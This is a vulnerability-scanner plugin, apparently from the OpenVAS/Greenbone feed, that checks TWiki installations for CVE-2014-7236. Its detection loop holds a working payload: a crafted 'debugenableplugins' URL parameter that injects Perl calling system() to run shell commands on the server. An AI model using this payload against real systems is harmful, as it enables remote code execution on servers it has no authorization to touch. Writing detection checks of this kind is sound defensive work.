CPE = "cpe:/a:twiki:twiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105097" );
	script_bugtraq_id( 70372 );
	script_cve_id( "CVE-2014-7236" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "TWiki 'debugenableplugins' Parameter Remote Code Execution Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-10-27 12:57:24 +0100 (Mon, 27 Oct 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_twiki_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "twiki/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/70372" );
	script_xref( name: "URL", value: "http://twiki.org/" );
	script_tag( name: "impact", value: "Attackers can exploit this issue
 to execute arbitrary code in the context of the webserver user." );
	script_tag( name: "vuldetect", value: "Send a HTTP GET request and check the response." );
	script_tag( name: "insight", value: "It is possible to execute arbitrary Perl code by adding a
'debugenableplugins=' parameter with a specially crafted value." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "summary", value: "TWiki is prone to remote code-execution vulnerability." );
	script_tag( name: "affected", value: "TWiki 6.0.0, 5.1.0-5.1.4, 5.0.0-5.0.2, 4.3.0-4.3.2, 4.2.0-4.2.4, 4.1.0-4.1.2,
4.0.0-4.0.5." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	dir = "";
}
cmds = exploit_commands();
for cmd in keys( cmds ) {
	ex = "?debugenableplugins=BackupRestorePlugin%3bprint(\"Content-Type:text/html\\r\\n\\r\\n\")%3bprint(system(\"" + cmds[cmd] + "\"))%3bexit";
	url = dir + "/view/Main/WebHome" + ex;
	if(http_vuln_check( port: port, url: url, pattern: cmd, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

